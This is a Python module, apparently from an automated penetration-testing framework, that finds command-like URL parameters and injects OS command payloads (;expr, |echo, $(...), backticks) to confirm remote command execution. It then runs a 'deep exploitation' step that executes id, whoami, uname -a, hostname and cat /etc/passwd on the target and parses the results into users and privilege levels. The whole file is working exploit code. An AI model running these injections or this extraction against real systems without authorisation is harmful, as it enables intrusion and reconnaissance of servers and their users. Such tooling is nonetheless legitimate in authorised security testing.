"""Remote Command Execution (RCE) Attack Module with Deep Exploitation (V15).

Verifies arbitrary operating system command execution:
- Mathematical arithmetic canaries: expr 41235 + 23142 -> 64377
- Unique canary token echoes: echo agy_token_...
- Context separators: ;, &&, |, ||, `...`, $(...)

After confirmation, extracts:
- id (uid, gid, groups, privilege assessment)
- whoami (current user)
- uname -a (kernel info)
- cat /etc/passwd (system users — read-only)
- hostname (server identity)
"""

from __future__ import annotations

import logging
import random
import re
import uuid
import time
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from app.attacks.base import AttackPlan, BaseAttackModule, ValidationResult
from app.core.session_context import SessionContext
from app.orchestration.attack_opportunity import AttackOpportunity

logger = logging.getLogger("attacks.rce")


class RCEAttackModule(BaseAttackModule):
    def __init__(self) -> None:
        super().__init__(attack_type="rce", cwe_id="CWE-78", default_severity="CRITICAL")

    async def discover(self, target: str, context: Dict[str, Any]) -> List[AttackOpportunity]:
        opps: List[AttackOpportunity] = []
        urls = context.get("urls", [])
        for u in urls:
            parsed = urlparse(u)
            if parsed.query:
                params = parse_qs(parsed.query)
                for p in params:
                    if any(k in p.lower() for k in ("cmd", "exec", "command", "run", "ping", "daemon", "eval", "cli", "shell", "ip", "host")):
                        opps.append(
                            AttackOpportunity(
                                target=target,
                                endpoint=u,
                                parameter=p,
                                attack_type="rce",
                                hypothesis=f"Command parameter '{p}' on {parsed.path} may allow OS command injection.",
                                priority=98,
                            )
                        )
        return opps

    async def plan(self, opportunity: AttackOpportunity) -> AttackPlan:
        num1 = random.randint(10000, 50000)
        num2 = random.randint(10000, 50000)
        expected = str(num1 + num2)
        canary = f"token_{uuid.uuid4().hex[:6]}"

        return AttackPlan(
            title=f"Command Injection (RCE) Verification + System Extraction on {opportunity.parameter}",
            attack_type="rce",
            target=opportunity.endpoint,
            steps=[
                "1. Baseline response capture",
                f"2. Dispatch mathematical arithmetic probe (expr {num1} + {num2})",
                f"3. Dispatch echo canary token probe (echo {canary})",
                "4. Check for unescaped evaluation of arithmetic or token in response body",
                "5. Deep exploitation — extract id, whoami, uname -a, cat /etc/passwd, hostname",
            ],
            payloads=[
                f";expr {num1} + {num2}",
                f"|expr {num1} + {num2}",
                f"$(expr {num1} + {num2})",
                f";echo {canary}",
                f"|echo {canary}",
            ],
            expected_evidence=f"Arithmetic result {expected} or token {canary}, then system info (uid, passwd, hostname)",
            context={"parameter": opportunity.parameter, "num1": num1, "num2": num2, "expected": expected, "canary": canary},
        )

    async def validate(self, opportunity: AttackOpportunity, session: SessionContext) -> ValidationResult:
        endpoint = opportunity.endpoint
        param = opportunity.parameter
        if not param:
            return ValidationResult(
                is_vulnerable=False,
                confidence=0.0,
                proof_level="P0",
                attack_type="rce",
                target_url=endpoint,
                message="No parameter specified for RCE testing.",
            )

        parsed = urlparse(endpoint)
        query_params = parse_qs(parsed.query)
        orig_val = query_params.get(param, ["127.0.0.1"])[0]

        # 1. Baseline Request
        baseline_resp = await session.get(endpoint)
        baseline_body = baseline_resp.text

        # 2. Arithmetic Canary Test
        num1 = random.randint(11000, 49000)
        num2 = random.randint(11000, 49000)
        expected_sum = str(num1 + num2)

        test_payloads = [
            (f"{orig_val};expr {num1} + {num2}", ";"),
            (f"{orig_val}|expr {num1} + {num2}", "|"),
            (f"{orig_val}&&expr {num1} + {num2}", "&&"),
            (f"$(expr {num1} + {num2})", "$("),
            (f"`expr {num1} + {num2}`", "`"),
        ]

        confirmed_separator = None
        for payload, sep in test_payloads:
            t_params = dict(query_params)
            t_params[param] = [payload]
            probe_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(t_params, doseq=True), parsed.fragment))

            resp = await session.get(probe_url)
            resp_body = resp.text

            if expected_sum in resp_body and expected_sum not in baseline_body:
                if f"expr {num1} + {num2}" not in resp_body:
                    confirmed_separator = sep

                    # Deep exploitation: extract system info
                    exploitation_data = await self._exploit_system_info(
                        session, endpoint, param, query_params, parsed,
                        orig_val, sep, baseline_body,
                    )

                    poc_curl = f"curl -s -k '{probe_url}'"
                    return ValidationResult(
                        is_vulnerable=True,
                        confidence=0.99,
                        proof_level="P5" if exploitation_data else "P4",
                        attack_type="rce",
                        target_url=endpoint,
                        parameter=param,
                        baseline_status=baseline_resp.status_code,
                        exploit_status=resp.status_code,
                        evidence={
                            "payload": payload,
                            "evaluated_arithmetic": f"expr {num1} + {num2} -> {expected_sum}",
                            "response_sample": resp_body[:300],
                            "command_separator": sep,
                        },
                        exploitation_data=exploitation_data or {},
                        poc_curl=poc_curl,
                        message=f"CRITICAL: Remote Command Execution (RCE) confirmed on parameter '{param}' via mathematical canary."
                                + (f" System user: {exploitation_data.get('current_user', 'N/A')}" if exploitation_data else ""),
                        cwe_id="CWE-78",
                        severity="CRITICAL",
                    )

        # 3. Echo Canary Token Test
        canary = f"agy_{uuid.uuid4().hex[:8]}"
        echo_payloads = [
            (f"{orig_val};echo {canary}", ";"),
            (f"{orig_val}|echo {canary}", "|"),
            (f"{orig_val}&&echo {canary}", "&&"),
        ]
        for payload, sep in echo_payloads:
            t_params = dict(query_params)
            t_params[param] = [payload]
            probe_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(t_params, doseq=True), parsed.fragment))

            resp = await session.get(probe_url)
            if canary in resp.text and f"echo {canary}" not in resp.text:
                # Deep exploitation
                exploitation_data = await self._exploit_system_info(
                    session, endpoint, param, query_params, parsed,
                    orig_val, sep, baseline_body,
                )

                poc_curl = f"curl -s -k '{probe_url}'"
                return ValidationResult(
                    is_vulnerable=True,
                    confidence=0.98,
                    proof_level="P5" if exploitation_data else "P4",
                    attack_type="rce",
                    target_url=endpoint,
                    parameter=param,
                    baseline_status=baseline_resp.status_code,
                    exploit_status=resp.status_code,
                    evidence={
                        "payload": payload,
                        "canary_echoed": canary,
                        "command_separator": sep,
                    },
                    exploitation_data=exploitation_data or {},
                    poc_curl=poc_curl,
                    message=f"CRITICAL: Remote Command Execution (RCE) confirmed on parameter '{param}' via echo token."
                            + (f" System user: {exploitation_data.get('current_user', 'N/A')}" if exploitation_data else ""),
                    cwe_id="CWE-78",
                    severity="CRITICAL",
                )

        return ValidationResult(
            is_vulnerable=False,
            confidence=0.2,
            proof_level="P0",
            attack_type="rce",
            target_url=endpoint,
            parameter=param,
            message=f"Parameter '{param}' did not execute operating system command probes.",
        )

    async def _exploit_system_info(
        self,
        session: SessionContext,
        endpoint: str,
        param: str,
        query_params: dict,
        parsed: Any,
        orig_val: str,
        separator: str,
        baseline_body: str,
    ) -> Optional[Dict[str, Any]]:
        """Extract full system information after RCE is confirmed.

        Runs: id, whoami, uname -a, cat /etc/passwd, hostname (all read-only).
        """
        exploitation: Dict[str, Any] = {"command_outputs": {}}

        # Read-only system info commands
        commands = [
            ("id", "id_output", r"uid=\d+"),
            ("whoami", "whoami_output", r"\S+"),
            ("uname -a", "uname_output", r"Linux\s+\S+"),
            ("hostname", "hostname_output", r"\S+"),
            ("cat /etc/passwd", "passwd_output", r"root:"),
            ("cat /etc/os-release 2>/dev/null || cat /etc/issue", "os_info", r"(NAME|DISTRIB|Ubuntu|Debian)"),
        ]

        for cmd, key, validation in commands:
            payload = f"{orig_val}{separator}{cmd}"
            t_params = dict(query_params)
            t_params[param] = [payload]
            probe_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path, parsed.params,
                urlencode(t_params, doseq=True), parsed.fragment,
            ))

            resp = await session.get(probe_url)
            if not resp:
                continue

            # Extract new content not in baseline
            output = self._extract_new_content(baseline_body, resp.text)
            if output and re.search(validation, output, re.I):
                exploitation["command_outputs"][key] = output.strip()

                # Parse specific outputs
                if key == "id_output":
                    id_match = re.search(
                        r"uid=(\d+)\((\w+)\)\s+gid=(\d+)\((\w+)\)\s+groups=(.*?)(?:\n|$)",
                        output,
                    )
                    if id_match:
                        exploitation["uid"] = int(id_match.group(1))
                        exploitation["username"] = id_match.group(2)
                        exploitation["gid"] = int(id_match.group(3))
                        exploitation["primary_group"] = id_match.group(4)
                        exploitation["groups_raw"] = id_match.group(5).strip()

                        priv_groups = {"root", "sudo", "wheel", "admin", "docker"}
                        user_groups = set(re.findall(r"\((\w+)\)", exploitation["groups_raw"]))
                        exploitation["privilege_level"] = (
                            "PRIVILEGED" if user_groups & priv_groups else "STANDARD_USER"
                        )
                        exploitation["privileged_groups"] = list(user_groups & priv_groups)

                elif key == "whoami_output":
                    exploitation["current_user"] = output.strip().split("\n")[0].strip()

                elif key == "hostname_output":
                    exploitation["hostname"] = output.strip().split("\n")[0].strip()

                elif key == "uname_output":
                    exploitation["kernel_info"] = output.strip().split("\n")[0].strip()

                elif key == "passwd_output":
                    passwd_lines = [
                        line for line in output.strip().splitlines()
                        if ":" in line and not line.startswith("#")
                    ]
                    exploitation["passwd_entries"] = len(passwd_lines)
                    exploitation["passwd_content"] = "\n".join(passwd_lines)

                    # Extract real users (uid >= 1000 or root)
                    real_users = []
                    for line in passwd_lines:
                        parts = line.split(":")
                        if len(parts) >= 7:
                            try:
                                uid = int(parts[2])
                                if uid >= 1000 or parts[0] == "root":
                                    real_users.append({
                                        "username": parts[0],
                                        "uid": uid,
                                        "home": parts[5],
                                        "shell": parts[6],
                                    })
                            except (ValueError, IndexError):
                                pass
                    exploitation["real_users"] = real_users

        if exploitation.get("command_outputs"):
            exploitation["commands_executed"] = len(exploitation["command_outputs"])
            return exploitation

        return None

    @staticmethod
    def _extract_new_content(baseline: str, exploit: str) -> str:
        """Extract content present in exploit response but not in baseline."""
        baseline_lines = set(baseline.splitlines())
        new_lines = []
        for line in exploit.splitlines():
            if line not in baseline_lines and line.strip():
                clean = re.sub(r"<[^>]+>", "", line).strip()
                if clean:
                    new_lines.append(clean)
        return "\n".join(new_lines)
